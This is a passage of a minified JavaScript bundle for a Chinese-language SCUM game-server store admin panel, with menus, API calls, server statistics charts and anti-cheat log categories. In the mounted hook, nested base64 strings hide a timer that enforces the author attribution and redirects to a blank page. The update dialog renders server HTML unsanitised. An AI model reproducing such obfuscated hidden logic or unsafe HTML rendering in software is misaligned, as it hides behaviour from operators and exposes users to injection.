!function(e){function t(t){for(var a,o,s=t[0],l=t[1],c=t[2],u=0,p=[];u<s.length;u++)o=s[u],Object.prototype.hasOwnProperty.call(n,o)&&n[o]&&p.push(n[o][0]),n[o]=0;for(a in l)Object.prototype.hasOwnProperty.call(l,a)&&(e[a]=l[a]);for(d&&d(t);p.length;)p.shift()();return r.push.apply(r,c||[]),i()}function i(){for(var e,t=0;t<r.length;t++){for(var i=r[t],a=!0,s=1;s<i.length;s++){var l=i[s];0!==n[l]&&(a=!1)}a&&(r.splice(t--,1),e=o(o.s=i[0]))}return e}var a={},n={app:0},r=[];function o(t){if(a[t])return a[t].exports;var i=a[t]={i:t,l:!1,exports:{}};return e[t].call(i.exports,i,i.exports,o),i.l=!0,i.exports}o.m=e,o.c=a,o.d=function(e,t,i){o.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:i})},o.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},o.t=function(e,t){if(1&t&&(e=o(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var i=Object.create(null);if(o.r(i),Object.defineProperty(i,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var a in e)o.d(i,a,function(t){return e[t]}.bind(null,a));return i},o.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(t,"a",t),t},o.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},o.p="/admin/";var s=window.webpackJsonp=window.webpackJsonp||[],l=s.push.bind(s);s.push=t,s=s.slice();for(var c=0;c<s.length;c++)t(s[c]);var d=l;r.push([0,"chunk-vendors"]),i()}({0:function(e,t,i){e.exports=i("56d7")},"164e":function(e,t){e.exports=echarts},"1f29":function(e,t,i){},2039:function(e,t,i){},2735:function(e,t,i){"use strict";i("6392")},"2bdb":function(e,t,i){"use strict";i("55ea")},"30cd":function(e,t,i){},3333:function(e,t,i){"use strict";i("a06f")},"384c":function(e,t,i){"use strict";i("30cd")},"494e":function(e,t,i){"use strict";i("2039")},"4e72":function(e,t){e.exports=antd},"55ea":function(e,t,i){},"56d7":function(e,t,i){"use strict";i.r(t);i("e260"),i("e6cf"),i("cca6"),i("a79d");var a=i("8bbf"),n=i.n(a),r=i("15fd"),o=i("1da1"),s=i("5530"),l=(i("96cf"),i("2ca0"),i("ac1f"),i("1276"),i("d3b7"),i("25f0"),i("b639")),c=i("677e"),d=i.n(c),u=(i("159b"),i("cebe")),p=i.n(u),m=i("e63d"),g=i.n(m);window.axiosRequests=[];var h=function(e){var t=e.baseURL,i=e.headers,a=p.a.create({baseURL:t,headers:Object(s.a)({"with-credentials":!0},i),timeout:6e5});return a.defaults.withCredentials=!0,a.interceptors.request.use((function(e){return-1===e.url.indexOf("/authAdminSys/login")&&(e.cancelToken=new p.a.CancelToken((function(e){window.axiosRequests.push({cancel:e})}))),e})),a.interceptors.response.use((function(e){if(!(e.status>=200&&e.status<300))return g.a.error("系统错误："+e.url),Promise.reject(new Error("http ".concat(e)));if(200===e.data.status)return Promise.resolve(e.data);if(6e4!==e.data.status)return g.a.error(e.data.msg||e.data.data.msg),Promise.resolve(e.data);window.axiosRequests.forEach((function(e,t){e.cancel(),delete window.axiosRequests[t]})),g.a.error("未登录");var t=2===window.location.href.split("#").length?window.location.href.split("#")[0]:"/";window.location.href=t+"#/login",location.reload()}),(function(e){return e.toString().startsWith("Cancel")||g.a.error("系统错误："+e),Promise.reject(new Error("系统错误：".concat(e)))})),a},f=function(e){var t=h({baseURL:window.BACKEND_HOST,headers:{}})(Object.assign(e,{serviceType:"".concat(window.SERVER_NAME,"_scum_store")}));return t.finally((function(){t=null})),t},y=[{path:"user",text:"商城用户管理"},{path:"squads",text:"队伍管理"},{path:"items",text:"商品管理"},{path:"buy",text:"购买管理"},{path:"prizes",text:"抽奖记录"},{path:"pay",text:"支付管理"},{path:"charge-dollar",text:"充值码管理"},{path:"queue",text:"机器人消息队列管理"},{path:"user-login",text:"所有登录退出记录"},{path:"kill",text:"所有击杀记录"},{path:"admin-command",text:"管理员指令日志管理"},{path:"chat-message",text:"游戏聊天记录管理"},{path:"actions-record",text:"游戏行为记录管理"},{path:"violations-record",text:"违规日志记录管理"},{path:"economy",text:"NPC交易日志记录管理"},{path:"chest-ownership-record",text:"箱子归属日志记录管理"},{path:"vehicle-destruction-record",text:"载具销毁日志记录管理"},{path:"unrecognized-record",text:"未识别日志记录管理"},{path:"scum-ban",text:"商城联办"},{path:"vehicle-ensurance",text:"载具保险记录管理"},{path:"story-lines",text:"剧本模式设置"},{path:"lottery",text:"公益彩票记录管理"},{path:"lhd",text:"比大小记录管理"},{path:"resource-recycle",text:"物资回收记录管理"},{path:"server-configs",text:"商城配置管理"},{path:"attachments",text:"图片附件管理"},{path:"admin-record",text:"商城后台操作日志"},{path:"tools",text:"实用工具集"}],v=i("5880"),x=i.n(v),b={name:"Loading",props:{show:{type:Boolean,default:!0},tip:{type:String,default:""}}},S=i("2877"),w=Object(S.a)(b,(function(){var e=this.$createElement,t=this._self._c||e;return this.show?t("div",{staticStyle:{width:"100%",height:"100%"}},[t("div",{staticStyle:{position:"absolute",width:"100%",height:"100%",display:"table",background:"white",opacity:"75%"}}),t("div",{staticStyle:{position:"absolute",width:"100%",height:"100%",display:"table"}},[t("div",{staticStyle:{width:"100%",height:"100%",display:"table-cell","vertical-align":"middle"}},[t("div",{staticStyle:{width:"100%",display:"block","text-align":"center"}},[t("a-spin",{attrs:{tip:this.tip}})],1)])])]):this._e()}),[],!1,null,"76408572",null).exports,L=["userDollar"],k={name:"",components:{Loading:w},data:function(){return{locale:d.a,window:window,serverName:window.SERVER_NAME,menuData:y,isMenuCollapsed:!1,isAlive:!0,interval:null}},computed:Object(s.a)(Object(s.a)({},Object(v.mapState)(["userInfo","serverStatus","loginLoading"])),{},{currentRoute:function(){return this.$route.fullPath.startsWith("/")?this.$route.fullPath.substring(1,this.$route.fullPath.length).split("?")[0]:this.$route.fullPath}}),watch:{$route:function(e){this.checkUser(e.path)}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.checkUser(e.$route.path);case 2:e.checkServerStatusRollback(),e.getUpdateMsg(),e.interval=setInterval((function(){if(e.userInfo&&null!==e.userInfo.userName){var t="Tm1GMVZEVnZiWE0xWW1saw==",i="VkRGU1ZtUXdOWEZSV0doT1ZrVXdlZz09",a=e.$refs[e.b(e.b("WVhWMGFHOXlMV052Ym5SbGJuUT0="))],n=e.$refs[e.b(e.b("WjNKdmRYQXRZMjl1ZEdWdWRBPT0="))];a&&n||(location.href=e.b(e.b("WVdKdmRYUTZZbXhoYm1zPQ=="))),a.innerText!==e.b(e.b(e.b(t)))&&(a.innerText=e.b(e.b(e.b(t)))),n.innerText!==e.b(e.b(e.b(e.b(i))))&&(n.innerText=e.b(e.b(e.b(e.b(i)))))}}),5e3);case 5:case"end":return t.stop()}}),t)})))()},methods:{b:function(e){return l.Buffer.from(e,"base64").toString("utf-8")},checkUser:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,o,s;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:if(console.log(e),!e.startsWith("/login")){i.next=3;break}return i.abrupt("return");case 3:if(t.userInfo&&null!==t.userInfo.userName){i.next=16;break}return i.prev=4,t.$store.commit("setLoginLoading",!0),i.next=8,f({method:"GET",url:"/userAdminSys/checkUserInfo"});case 8:a=i.sent,t.$store.commit("setLoginLoading",!1),200===a.status?(n=a.data,o=n.userDollar,s=Object(r.a)(n,L),t.$store.commit("setUserInfo",s),t.$store.commit("setUserDollar",o),t.getCommandSelectConfigs(),t.getScumMapConfigs()):t.$router.push({path:"/login"}),i.next=16;break;case 13:i.prev=13,i.t0=i.catch(4),console.log(i.t0);case 16:case"end":return i.stop()}}),i,null,[[4,13]])})))()},getUpdateMsg:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/app/updateMsg"});case 3:200===(i=t.sent).status&&"1"!==localStorage.getItem(null==i||null===(a=i.data)||void 0===a?void 0:a.updateDate)&&(localStorage.setItem(null==i||null===(n=i.data)||void 0===n?void 0:n.updateDate,"1"),o=e.$createElement,s=e.$info({title:"更新提醒，请前往Github下载最新版本(".concat(null==i||null===(r=i.data)||void 0===r?void 0:r.version,")"),content:o("div",{domProps:{innerHTML:i.data.detail}},[]),onOk:function(){s.destroy()}})),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.log(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},checkServerStatusRollback:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.isAlive){t.next=2;break}return t.abrupt("return");case 2:if(!e.userInfo||null===e.userInfo.userName){t.next=17;break}return t.prev=3,t.next=6,f({method:"GET",url:"/serverConfigAdminSys/serverStatus"});case 6:i=t.sent,a={ServerIP:null,OnlinePlayers:null},200===i.status&&(a.ServerIP=i.data.ServerIP,a.OnlinePlayers=i.data.OnlinePlayers,a.ServerDetail=i.data.ServerDetail),e.$store.commit("setServerStatus",a),setTimeout((function(){e.checkServerStatusRollback()}),3e4),t.next=17;break;case 13:t.prev=13,t.t0=t.catch(3),setTimeout((function(){e.checkServerStatusRollback()}),3e4),console.error(t.t0);case 17:case"end":return t.stop()}}),t,null,[[3,13]])})))()},getCommandSelectConfigs:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/commandSelectConfigs"});case 3:i=t.sent,e.$store.commit("setLoginLoading",!1),200===i.status&&e.$store.commit("setCommandSelectConfigs",i.data),t.next=11;break;case 8:t.prev=8,t.t0=t.catch(0),console.log(t.t0);case 11:case"end":return t.stop()}}),t,null,[[0,8]])})))()},getScumMapConfigs:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfig/scumMapConfigs"});case 3:200===(i=t.sent).status&&(e.$store.commit("setMapBorder",i.data.GameMapBorderInfo),(a=new Image).src=i.data.GameMapImageUrl,a.onload=function(){e.$store.commit("setScumMapImageObject",a)}),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.log(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},gotoPath:function(e){this.$router.push({path:"/".concat(e.key)})},logout:function(){var e=this;f({method:"GET",url:"/authAdminSys/logout"}).then((function(t){e.$router.push({path:"/login"}),location.reload()}))}},beforeDestroy:function(){this.isAlive=!1,clearInterval(this.interval)}},I=(i("5c0b"),Object(S.a)(k,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{attrs:{id:"app"}},[i("a-config-provider",{attrs:{locale:e.locale}},[i("a-layout",{staticStyle:{height:"100vh",width:"100%",position:"relative"}},[i("a-layout-header",{staticStyle:{height:"50px",width:"100%",background:"rgb(0, 33, 64)","box-shadow":"rgb(27 26 26) 0px 0px 9px 0px",padding:"0 20px",position:"absolute"}},[i("div",{staticStyle:{width:"180px",height:"100%",display:"inline-block","line-height":"50px",color:"white","vertical-align":"top","font-size":"18px","font-weight":"bolder"}},[e._v(e._s(e.serverName)+"服商城管理后台")]),i("div",{staticStyle:{"margin-left":"20px",width:"calc(100% - 200px)",height:"100%",display:"inline-block","line-height":"50px",color:"white","vertical-align":"top","text-align":"right","white-space":"nowrap","overflow-x":"auto"}},[e.userInfo&&null!==e.userInfo.userName?i("div",{staticStyle:{float:"left",display:"inline-block","vertical-align":"top","min-width":"200px"}},[i("span",[e._v("服务器在线人数：")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(e.serverStatus.OnlinePlayers||"暂无信息"))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("服务器IP地址：")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(e.serverStatus.ServerIP||"暂无信息"))]),i("a",{staticStyle:{"margin-left":"10px"},attrs:{target:"_blank",href:e.window.location.origin+"/store"}},[e._v("跳转到商城首页")])]):e._e(),i("div",{staticStyle:{"max-width":"150px","min-width":"100px","text-align":"right",display:"inline-block","vertical-align":"top"}},[e.userInfo&&null!==e.userInfo.userName?i("a-dropdown",[i("div",{staticStyle:{cursor:"pointer"}},[i("a-avatar",{staticStyle:{transform:"translateY(-2px)"},attrs:{size:32,icon:"user"}}),i("span",{staticStyle:{"margin-left":"10px",width:"auto"}},[e._v(e._s(e.userInfo.userName))])],1),i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[i("a-menu-item",[i("span",{staticStyle:{cursor:"pointer"},on:{click:e.logout}},[e._v("退出登录")])])],1)],1):e._e()],1)])]),e.loginLoading?i("Loading",{directives:[{name:"show",rawName:"v-show",value:!0,expression:"true"}],staticStyle:{width:"100%",height:"calc(100vh - 50px)",top:"50px",position:"absolute"},attrs:{tip:"加载中"}}):i("a-layout",{staticStyle:{width:"100%",height:"calc(100vh - 50px)",top:"50px",position:"absolute"}},[e.userInfo&&null!==e.userInfo.userName?i("a-layout-sider",{staticStyle:{height:"100%",width:"240px",flex:"0 0 240px",background:"#001529"},attrs:{width:"240",collapsible:!0,collapsed:e.isMenuCollapsed,trigger:null}},[i("a-menu",{staticStyle:{height:"calc(100% - 96px)","overflow-y":"auto"},attrs:{mode:"inline",theme:"dark",selectedKeys:[e.currentRoute]},on:{select:e.gotoPath}},[i("a-menu-item",{key:"server-info"},[i("a-row",{staticStyle:{width:"100%"}},[i("a-col",{staticStyle:{display:"inline-block",width:"20px","vertical-align":"top"}},[i("a-icon",{staticStyle:{color:"yellow"},attrs:{type:"fund",theme:"filled"}})],1),i("a-col",{staticStyle:{display:"inline-block",width:"calc(100% - 25px)","margin-left":"5px",overflow:"hidden","text-overflow":"ellipsis","white-space":"nowrap","vertical-align":"top"}},[i("div",{staticStyle:{width:"100%",height:"20px","line-height":"20px"}},[i("span",[e._v("排名：")]),e.serverStatus&&e.serverStatus.ServerDetail?i("strong",{staticStyle:{color:"lightgreen"}},[e._v("No."+e._s(e.serverStatus.ServerDetail.rank))]):i("strong",{staticStyle:{color:"red"}},[e._v("-")])]),i("div",{staticStyle:{width:"100%",height:"20px","line-height":"20px"}},[i("span",[e._v("地区：")]),e.serverStatus&&e.serverStatus.ServerDetail?i("strong",{staticStyle:{color:"yellow"}},[e._v(e._s(e.serverStatus.ServerDetail.country))]):i("strong",{staticStyle:{color:"red"}},[e._v("-")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("服务器：")]),e.serverStatus&&e.serverStatus.ServerDetail?i("strong",["online"===e.serverStatus.ServerDetail.status?i("span",{staticStyle:{color:"lightgreen"}},[e._v("在线")]):i("span",{staticStyle:{color:"red"}},[e._v("异常")])]):i("strong",{staticStyle:{color:"red"}},[e._v("-")])])])],1)],1),e._l(e.menuData,(function(t){return i("a-menu-item",{key:t.path},[i("a-row",{staticStyle:{width:"100%"}},[i("a-col",{staticStyle:{display:"inline-block",width:"20px","vertical-align":"top"}},[i("a-icon",{attrs:{type:"menu-unfold"}})],1),i("a-col",{staticStyle:{display:"inline-block",width:"calc(100% - 25px)","margin-left":"5px",overflow:"hidden","text-overflow":"ellipsis","white-space":"nowrap","vertical-align":"top"}},[e._v(" "+e._s(t.text)+" ")])],1)],1)}))],2),i("div",{staticStyle:{width:"100%",height:"48px",color:"white",padding:"0 20px"}},[i("div",{staticStyle:{width:"100%",height:"24px","line-height":"24px",cursor:"pointer"},on:{click:function(){return e.window.open("http://wpa.qq.com/msgrd?v=3&uin=1065617282&site=qq&menu=yes","_blank")}}},[i("a-icon",{staticStyle:{"font-size":"18px",transform:"translateY(2px)"},attrs:{type:"qq"}}),i("span",{ref:"author-title",staticStyle:{"margin-left":"5px"}},[e._v("开源商城作者:")]),i("span",{ref:"author-content",staticStyle:{"margin-left":"5px","font-weight":"bolder"}},[e._v("髓扬帝")])],1),i("div",{staticStyle:{width:"100%",height:"24px","line-height":"24px",cursor:"pointer"},on:{click:function(){return e.window.open("http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=0sA5p3quJ3iyBs0HAhtNiBSwti2xe72N&authKey=SNz1c5HS2PIouEHs49R6R6h1FQzbNwiavOyGouR83uLv1qrvLohGm9WSdea4jAtg&noverify=0&group_code=950601137","_blank")}}},[i("a-icon",{staticStyle:{"font-size":"18px",transform:"translateY(2px)"},attrs:{type:"usergroup-add"}}),i("span",{ref:"group-title",staticStyle:{"margin-left":"5px"}},[e._v("咨询讨论群:")]),i("span",{ref:"group-content",staticStyle:{"margin-left":"5px","font-weight":"bolder","font-style":"oblique"}},[e._v("950601137")])],1),i("div",{staticStyle:{width:"100%",height:"24px","line-height":"24px"}})]),i("div",{staticStyle:{height:"48px",width:"100%","text-align":"center","line-height":"48px",cursor:"pointer"},on:{click:function(t){e.isMenuCollapsed=!e.isMenuCollapsed}}},[i("a-icon",{staticStyle:{color:"white"},attrs:{type:e.isMenuCollapsed?"right":"left"}})],1)],1):e._e(),i("a-layout-content",{staticStyle:{width:"100%",height:"100%",position:"relative",overflow:"auto"}},[i("router-view")],1)],1)],1)],1)],1)}),[],!1,null,null,null).exports),_=i("6389"),T=i.n(_),C=i("2909"),F=(i("4e82"),i("d81d"),i("c32d")),R=i.n(F),E={name:"ServerInfo",components:{},computed:Object(s.a)({},Object(v.mapState)(["serverStatus"])),data:function(){return{moment:R.a,loadingHistory:!1,rankHistory:{},playerCountHistory:{}}},mounted:function(){this.getHistoryList()},methods:{getHistoryList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loadingHistory=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/rankHistory"});case 4:return 200===(i=t.sent).status&&e.$set(e,"rankHistory",null===(a=i.data)||void 0===a?void 0:a.data.sort((function(e,t){return R()(e.attributes.timestamp).valueOf()-R()(t.attributes.timestamp).valueOf()}))),t.next=8,f({method:"GET",url:"/serverConfigAdminSys/playerCountHistory"});case 8:n=t.sent,e.loadingHistory=!1,200===n.status&&e.$set(e,"playerCountHistory",null===(r=n.data)||void 0===r?void 0:r.data.sort((function(e,t){return R()(e.attributes.timestamp).valueOf()-R()(t.attributes.timestamp).valueOf()}))),e.$nextTick((function(){e.draw()})),t.next=18;break;case 14:t.prev=14,t.t0=t.catch(1),console.error(t.t0),e.loadingHistory=!1;case 18:case"end":return t.stop()}}),t,null,[[1,14]])})))()},draw:function(){var e=this.$echarts.init(document.getElementById("rankHistoryChart")),t=Math.max.apply(Math,Object(C.a)(this.rankHistory.map((function(e){return e.attributes.value})))),i=Math.min.apply(Math,Object(C.a)(this.rankHistory.map((function(e){return e.attributes.value})))),a=this.rankHistory.map((function(e){return{value:t-e.attributes.value+1,label:{show:!0,position:"top",formatter:e.attributes.value+"",color:e.attributes.value===t?"green":e.attributes.value===i?"red":"black",fontWeight:e.attributes.value===t||e.attributes.value===i?"bolder":"normal"},itemStyle:{borderRadius:[20,20,0,0]}}}));e.setOption({xAxis:{type:"category",data:this.rankHistory.map((function(e){return R()(e.attributes.timestamp).format("YYYY-MM-DD")}))},yAxis:{type:"value",max:function(e){return e.max},min:0,show:!1},series:[{type:"bar",data:a}]});var n=this.$echarts.init(document.getElementById("playerCountHistoryChart")),r=Math.max.apply(Math,Object(C.a)(this.playerCountHistory.map((function(e){return e.attributes.max})))),o=Math.min.apply(Math,Object(C.a)(this.playerCountHistory.map((function(e){return e.attributes.max})))),s=Math.max.apply(Math,Object(C.a)(this.playerCountHistory.map((function(e){return e.attributes.value})))),l=Math.min.apply(Math,Object(C.a)(this.playerCountHistory.map((function(e){return e.attributes.value})))),c=Math.max.apply(Math,Object(C.a)(this.playerCountHistory.map((function(e){return e.attributes.min})))),d=Math.min.apply(Math,Object(C.a)(this.playerCountHistory.map((function(e){return e.attributes.min})))),u=this.playerCountHistory.map((function(e){return{value:e.attributes.max,label:{show:e.attributes.max===r||e.attributes.max===o,position:"top",formatter:e.attributes.max+"",color:e.attributes.max===r?"green":e.attributes.max===o?"red":"black",fontWeight:e.attributes.max===r||e.attributes.max===o?"bolder":"normal"}}})),p=this.playerCountHistory.map((function(e){return{value:e.attributes.value,label:{show:e.attributes.value===s||e.attributes.value===l,position:"top",formatter:e.attributes.value+"",color:e.attributes.value===s?"green":e.attributes.value===l?"red":"black",fontWeight:e.attributes.value===s||e.attributes.value===l?"bolder":"normal"}}})),m=this.playerCountHistory.map((function(e){return{value:e.attributes.min,label:{show:e.attributes.min===c||e.attributes.min===d,position:"top",formatter:e.attributes.min+"",color:e.attributes.min===c?"green":e.attributes.min===d?"red":"black",fontWeight:e.attributes.min===c||e.attributes.min===d?"bolder":"normal"}}}));n.setOption({xAxis:{type:"category",boundaryGap:!1,data:this.playerCountHistory.map((function(e){return R()(e.attributes.timestamp).format("YYYY-MM-DD")}))},yAxis:{type:"value"},tooltip:{trigger:"axis",axisPointer:{type:"cross",label:{backgroundColor:"#6a7985"}}},legend:{data:["最大玩家数量","平均玩家数量","最小玩家数量"]},series:[{name:"最大玩家数量",type:"line",stack:"Total",smooth:!0,areaStyle:{},emphasis:{focus:"series"},data:u},{name:"平均玩家数量",type:"line",stack:"Total",smooth:!0,areaStyle:{},emphasis:{focus:"series"},data:p},{name:"最小玩家数量",type:"line",stack:"Total",smooth:!0,areaStyle:{},emphasis:{focus:"series"},data:m}]})}}},P=Object(S.a)(E,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"服务器信息"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[e.serverStatus&&e.serverStatus.ServerDetail?[i("a-descriptions",{attrs:{bordered:"",size:"small"}},[i("a-descriptions-item",{attrs:{label:"服务器名字",span:3}},[e._v(e._s(e.serverStatus.ServerDetail.name))]),i("a-descriptions-item",{attrs:{label:"服务器IP",span:2}},[e._v(e._s(e.serverStatus.ServerDetail.ip)+":"+e._s(e.serverStatus.ServerDetail.port))]),i("a-descriptions-item",{attrs:{label:"地区"}},[e._v(e._s(e.serverStatus.ServerDetail.country))]),i("a-descriptions-item",{attrs:{label:"人数",span:2}},[e._v(e._s(e.serverStatus.ServerDetail.players)+"/"+e._s(e.serverStatus.ServerDetail.maxPlayers))]),i("a-descriptions-item",{attrs:{label:"状态"}},[i("a-badge",{attrs:{status:"online"===e.serverStatus.ServerDetail.status?"processing":"error",text:"online"===e.serverStatus.ServerDetail.status?"在线":"异常"}})],1),i("a-descriptions-item",{attrs:{label:"排名",span:2}},[e._v("No."+e._s(e.serverStatus.ServerDetail.rank))]),i("a-descriptions-item",{attrs:{label:"游戏服务器版本"}},[e._v(e._s(e.serverStatus.ServerDetail.details.version))])],1),e._m(0),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"230px"},attrs:{id:"rankHistoryChart"}}),e._m(1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"230px"},attrs:{id:"playerCountHistoryChart"}})]:[i("div",{staticStyle:{width:"100%",height:"200px","line-height":"200px","text-align":"center"}},[e._v("暂无数据，请刷新网页或检查BattleMetric ID是否已经设置")])]],2)])],1)}),[function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticStyle:{width:"100%",height:"24px",position:"relative",background:"white","margin-top":"10px"}},[t("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),t("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[t("span",[this._v("服务器历史排名数据")])])])},function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticStyle:{width:"100%",height:"24px",position:"relative",background:"white","margin-top":"10px"}},[t("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),t("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[t("span",[this._v("服务器玩家数量统计")])])])}],!1,null,"54c594d5",null).exports,A=(i("7db0"),i("b64b"),i("99af"),i("a15b"),i("e9c4"),i("a4d3"),i("e01a"),i("a9e3"),i("00b4"),i("b680"),i("c740"),i("60bb"));function D(e){return!(!/^\d+(\.\d+)?$/.test(e)&&!/^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$/.test(e))}var $=[{value:"KickPlayer-NetErrorConnectionLost",label:"踢出玩家(网络连接错误)",desc:"玩家掉线",color:"green"},{value:"KickPlayer-NetFileIntegrityCompromised",label:"踢出玩家(文件完整性检查出错)",desc:"玩家游戏文件出错闪退",color:"green"},{value:"KickPlayer-NetErrorPingTooHigh",label:"踢出玩家(延迟过高)",desc:"玩家延迟太高被踢",color:"green"},{value:"KickPlayer-GenericKickReason",label:"踢出玩家(通用原因)",desc:"未知原因的系统自动踢出，可能是游戏BUG，也有可能是新型外挂",color:"orange"},{value:"KickPlayer-Add item to inventory violation",label:"踢出玩家(异常的操作柜子物品行为)",desc:"玩家操作柜子物品的时候被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"KickPlayer-Request character action violation",label:"踢出玩家(异常的玩家角色动作)",desc:"被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"KickPlayer-Damage to player violation",label:"踢出玩家(异常的伤害计算)",desc:"被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"KickPlayer-Light item interact violation",label:"踢出玩家(高亮附近贵重资源)",desc:"被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"orange"},{value:"KickPlayer-Auto add item violation",label:"踢出玩家(异常的物品自动添加)",desc:"玩家操作物品的时候被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂或者是利用游戏物品复制的bug",color:"orange"},{value:"KickPlayer-[InteractionViolation][GodModeFill]",label:"踢出玩家(检测到使用秒建的嫌疑)",desc:"玩家填充图纸的时候被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用秒建等外挂",color:"orange"},{value:"KickPlayer-[InteractionViolation][RemoveLocksAdmin]",label:"踢出玩家(检测到使用一键下锁的嫌疑)",desc:"玩家撬锁的时候被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用一键开锁等外挂",color:"orange"},{value:"KickPlayer-Infinite ammo cheat detected",label:"踢出玩家(检测到使用无限子弹外挂的嫌疑)",desc:"玩家使用武器的时候被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑使用无限子弹等外挂",color:"red"},{value:"KickPlayer-[Auto Add] Violation detected",label:"踢出玩家(检测到使用无限子弹外挂的嫌疑)",desc:"玩家操作物品时候被系统检测出异常自动踢出服务器，可能是网络问题，短时间内多次出现可怀疑利用物品复制等游戏漏洞",color:"red"},{value:"BanPlayer",label:"临时/永久封禁玩家",desc:"系统自动封禁/管理员打命令Ban人记录",color:"red"},{value:"Light item interact violation",label:"高亮附近贵重资源",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂或者是利用游戏物品复制的bug",color:"orange"},{value:"TakeDamageViolation-Take damage violation",label:"伤害结算异常(受伤结算)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂或者是利用游戏物品复制的bug",color:"orange"},{value:"Request character action violation-PrisonerActionRemoveWeedDescription",label:"玩家角色动作异常(除草)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionClimbOntoLadderDescription",label:"玩家角色动作异常(爬梯子)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionCommitSuicideDescription",label:"玩家角色动作异常(自杀)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action violation-PrisonerActionMinigameDescription",label:"玩家角色动作异常(开锁/拆弹)",desc:"可能是网络问题，短时间内多次出现可怀疑使用开锁、拆弹加速、灵魂出窍等外挂",color:"orange"},{value:"Request character action violation-PrisonerActionGestureDescription",label:"玩家角色动作异常(称谓)",desc:"可能是网络问题，短时间内多次出现可怀疑使用加速、灵魂出窍等外挂",color:"green"},{value:"Request character action 